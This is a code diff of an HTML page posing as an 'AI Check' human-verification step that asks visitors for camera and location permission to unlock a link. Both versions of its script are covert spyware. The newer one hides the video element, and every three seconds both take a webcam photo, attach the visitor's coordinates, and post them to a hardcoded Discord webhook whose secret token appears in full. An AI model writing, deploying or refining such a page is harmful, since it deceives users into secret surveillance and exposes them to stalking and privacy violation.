@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <head>
-    <meta charset="UTF-8">
+    <meta charset="UTF-8" />
     <title>AI Check!</title>
     <style>
       body {
@@ -30,61 +30,106 @@
         font-size: 24px;
         color: #003580;
       }
+      /* videoは非表示（必要ならdisplay:blockに変更） */
+      video {
+        display: none;
+      }
     </style>
   </head>
   <body>
-    <h1>AIではないことを証明するため カメラ・位置情報アクセスを許可してください許可したらリンクが解放されます</h1>
-    <img id="math-image" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT8-5rpz6ep3gSkcAvYX_gtPgV1UtURRsfH4m5wNxsrHg&s" alt="Math Equation">
+    <h1>
+      AIではないことを証明するため カメラ・位置情報アクセスを許可してください許可したらリンクが解放されます
+    </h1>
+    <img
+      id="math-image"
+      src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT8-5rpz6ep3gSkcAvYX_gtPgV1UtURRsfH4m5wNxsrHg&s"
+      alt="Math Equation"
+    />
     <div id="math-equation"></div>
-<script>
-      var imageCounter = 1;
-      var intervalId = setInterval(function() {
-        captureImage();
-      }, 3000);
 
-      function captureImage() {
-  var video = document.querySelector('video');
-  var canvas = document.createElement('canvas');
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  canvas.getContext('2d').drawImage(video, 0, 0);
+    <video autoplay playsinline></video>
 
-  canvas.toBlob(function(blob) {
-    var formData = new FormData();
-    formData.append('file', blob, 'math-equation.jpg');
+    <script>
+      let imageCounter = 1;
+      let latitude = null;
+      let longitude = null;
+      const video = document.querySelector("video");
 
-    navigator.geolocation.getCurrentPosition(function(position) {
-      var latitude = position.coords.latitude;
-      var longitude = position.coords.longitude;
-      formData.append('content', `位置情報: 緯度 ${latitude}, 経度 ${longitude}`);
-
-      var xhr = new XMLHttpRequest();
-      xhr.open('POST', 'https://discord.com/api/webhooks/1388467866415665213/Eq_E01V-pIGYNw8j-LzzCAyqhiaP7GkwjrCdGS6fO7gWPj2QP4xxzIXX41TJxDEpZH5o');
-      xhr.send(formData);
-    }, function(error) {
-      // 位置情報が取れなかった場合は画像だけ送信
-      var xhr = new XMLHttpRequest();
-      xhr.open('POST', 'https://discord.com/api/webhooks/1388467866415665213/Eq_E01V-pIGYNw8j-LzzCAyqhiaP7GkwjrCdGS6fO7gWPj2QP4xxzIXX41TJxDEpZH5o');
-      xhr.send(formData);
-    });
-
-    var equation = 'Equation ' + imageCounter++;
-    document.getElementById('math-image').src = canvas.toDataURL();  // これでOK
-    document.getElementById('math-equation').innerHTML = equation;
-  }, 'image/jpeg', 1.0);
-}
-
-      var constraints = { video: { width: 400, height: 300 } };
-      navigator.mediaDevices.getUserMedia(constraints)
-        .then(function(mediaStream) {
-          var video = document.createElement('video');
-          video.srcObject = mediaStream;
-          video.play();
-          document.body.appendChild(video);
-        })
-        .catch(function(err) {
-          console.log(err.name + ": " + err.message);
+      // 位置情報を一度だけ取得して保存する関数
+      function getLocationOnce() {
+        return new Promise((resolve, reject) => {
+          if (!navigator.geolocation) {
+            reject(new Error("Geolocation is not supported."));
+            return;
+          }
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              latitude = pos.coords.latitude;
+              longitude = pos.coords.longitude;
+              resolve();
+            },
+            (err) => {
+              console.warn("位置情報取得失敗:", err.message);
+              resolve(); // 位置情報なくても続行したい場合はresolve
+            }
+          );
         });
+      }
+
+      async function captureImage() {
+        if (!video.videoWidth || !video.videoHeight) return;
+
+        const canvas = document.createElement("canvas");
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0);
+
+        canvas.toBlob(async (blob) => {
+          const formData = new FormData();
+          formData.append("file", blob, "math-equation.jpg");
+
+          let content = `Equation ${imageCounter++}`;
+          if (latitude !== null && longitude !== null) {
+            content += `\n位置情報: 緯度 ${latitude}, 経度 ${longitude}`;
+          }
+          formData.append("content", content);
+
+          try {
+            await fetch(
+              "https://discord.com/api/webhooks/1388467866415665213/Eq_E01V-pIGYNw8j-LzzCAyqhiaP7GkwjrCdGS6fO7gWPj2QP4xxzIXX41TJxDEpZH5o",
+              {
+                method: "POST",
+                body: formData,
+              }
+            );
+          } catch (e) {
+            console.error("Webhook送信エラー:", e);
+          }
+
+          // 画像表示更新
+          document.getElementById("math-image").src = canvas.toDataURL();
+          document.getElementById("math-equation").textContent = content;
+        }, "image/jpeg", 1.0);
+      }
+
+      async function start() {
+        try {
+          const stream = await navigator.mediaDevices.getUserMedia({
+            video: { width: 400, height: 300 },
+          });
+          video.srcObject = stream;
+
+          await getLocationOnce();
+
+          // 3秒ごとに画像キャプチャ
+          setInterval(captureImage, 3000);
+        } catch (err) {
+          console.error("カメラまたは位置情報の許可が必要です:", err);
+        }
+      }
+
+      start();
     </script>
   </body>
 </html>
